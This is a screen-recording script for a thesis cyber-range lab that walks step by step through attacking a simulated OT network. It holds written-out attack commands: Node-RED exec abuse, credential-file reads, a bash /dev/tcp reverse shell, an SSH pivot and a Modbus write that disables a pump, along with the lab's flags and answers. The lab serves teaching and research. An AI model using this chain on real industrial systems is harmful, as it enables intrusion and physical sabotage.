# Thesis Screen Recording Guide & Walkthrough Script

*BSc Thesis Proof-of-Work: Complex OT Sandbox Demonstration (CyberRangeCZ)*

This checklist and step-by-step recording guide ensures you capture all the necessary components of your working OT sandbox before returning your hardware. The recording serves as permanent proof of reproducibility for your thesis appendix and presentation.

---

## 📹 Recording Settings (Best Practices)

* **Resolution:** 1080p (1920x1080) at 30 or 60 FPS.
* **Layout:** Clean desktop, close all unrelated tabs (personal emails, chats, unrelated code files).
* **Terminal Font:** Increase font size (zoom in 2–3 times) so shell outputs are easily legible on video.
* **Audio:** Optional (a silent video with clean, typed text is standard, but you can record voiceover).

---

## 🗂️ Pre-Recording Checklist

* [ ] Sandbox Pool (ID 53) is active in the CyberRangeCZ Portal.
* [ ] Kali Attacker Host (`10.10.10.50`), SCADA HMI (`192.168.100.10`), EWS (`192.168.20.20`), and OpenPLC (`192.168.20.10`) VMs are fully booted and active.
* [ ] No flag file exists on EWS (`/var/log/safety_override.txt` is removed).
* [ ] PLC holding register 0 is set to `1` (normal operation).
* [ ] Terminal window is open on Kali with two tabs:
  * Tab 1: Attacker shell (ready for `nc`).
  * Tab 2: Browser open to Node-RED HMI editor (`<http://192.168.100.10:1880>`).

---

## 🎬 Step-by-Step Recording Script

### Section 0: Sandbox Import & Pool Allocation (Duration: ~1m, Sped Up)

1. **Scenario Import:** Show the browser in the CyberRangeCZ portal under **Sandbox Definitions**. Click the **Import** button and select the scenario zip file containing `topology.yml` and provisioning playbooks.
2. **Allocation Trigger:** Go to the **Pools** tab, click **Create Pool**, choose your newly imported definition, set the size to `1`, and name it (e.g. `complex-ot-training`).
3. **Build Stage:** Show the allocation status entering the `BUILDING` state. (Note: Stop/pause recording here, or speed this up in editing, as the OpenTofu orchestration and Ansible VM compilation takes ~15–20 minutes).
4. **Active State:** Resume the recording showing the pool entering the `ACTIVE` state, confirming all 5 VMs successfully deployed.

---

### Section 1: The Portal & Topology Visualization (Duration: ~45s)

5. **Start Screen:** Show the CyberRangeCZ Portal dashboard showing your active OT pool.
6. **Definition Details:** Navigate to the Sandbox Definition detail view. Point out the single-homed VM layout.
7. **OpenStack Backend (Optional but good):** Briefly open a terminal showing `openstack server list --all-projects` to show the underlying VMs running on the KVM hypervisor.

---

### Section 2: SCADA Subnet Scan & HMI Discovery — Level 2 (Duration: ~1m)

8. **Network Discovery (Level 2):** From your Kali attacker host, scan the operations subnet to identify the active HMI host:

   ```bash
   nmap -p 1880 --open 192.168.100.0/24
   ```

   Show that port `1880` is open on IP `192.168.100.10`. Submit the answer `192.168.100.10:1880`.

---

### Section 3: SCADA HMI Exploitation — Level 3 (Duration: ~1m)

9. **Access Editor:** Open the browser and navigate to the unauthenticated Node-RED interface:

   `<http://192.168.100.10:1880/`>

10. **Build Execution Flow:** Drag an `inject` node, `exec` node, and `debug` node onto the canvas. Wire: inject → exec → debug.
11. **Configure command:** Double-click the `exec` node and set the command to:

   ```bash
cat /root/flag.txt
   ```

12. Click **Deploy**, then click the inject node trigger button.
13. Show the flag `FLAG{SCADA_HMI_COMPROMISED}` appearing in the debug panel. Submit the answer.

---

### Section 4: Credential Access — Level 4 (Duration: ~30s)

14. **Credential Extraction:** In the Node-RED exec node, change the command to:

   ```bash
   cat /home/debian/ews_credentials.txt
   ```

15. Click **Deploy** and trigger. Show the output `operator : operator123` in the debug panel. Submit the password `operator123` as the answer.

---

### Section 5: Reverse Shell, PTY Upgrade & Lateral Movement — Level 5 (Duration: ~2m)

16. **Listener Setup:** Switch to the Kali terminal and start the TCP listener:

   ```bash
   nc -nlvp 4444
   ```

17. **Deploy Reverse Shell:** Go back to Node-RED. Change the exec node command to the reverse shell payload:

```bash
   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
   ```

Click **Deploy** and trigger. Switch to Kali — the connection from `192.168.100.10` should appear.

18. **TTY Upgrade:** On the caught dumb shell, upgrade to a full interactive PTY:

   ```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

   Show the prompt changing to `root@scada-hmi:~#`.

19. **SSH Pivot:** From the upgraded HMI shell, SSH into the Engineering Workstation:

   ```bash
   ssh operator@192.168.20.20
```

   Type password `operator123` when prompted. Show the prompt changing to `operator@engineering-station:~$`.

20. **Control Network Recon:** Run the targeted port scan to locate the PLC:

```bash
   nmap -p 502 --open 192.168.20.0/24
   ```

Show port 502 (Modbus TCP) returning open on `192.168.20.10`. Submit `192.168.20.10` as the answer.

---

### Section 6: Modbus Sabotage & Flag Verification — Level 6 (Duration: ~1m)

21. **Sabotage Injection:** Write `0` to register 0 on the PLC using the Modbus CLI utility:

   ```bash
   modbus 192.168.20.10 0=0
   ```

22. **Flag Retrieval:** Read the log generated on EWS by the safety monitor script:

```bash
   cat /var/log/safety_override.txt
   ```

Show the final flag clearly on screen:
   `FLAG{PUMP_DISABLED_SUCCESS}`

23. **End Screen:** Close the terminal. Display the topology map one last time.

---

## 📌 Post-Recording Verification

* Review the recorded video to ensure all command entries, terminal outputs, and portal tabs are clear and sharp.
* Save the file as `Bsc_Thesis_OT_Pivot_Walkthrough.mp4` on your backup storage.
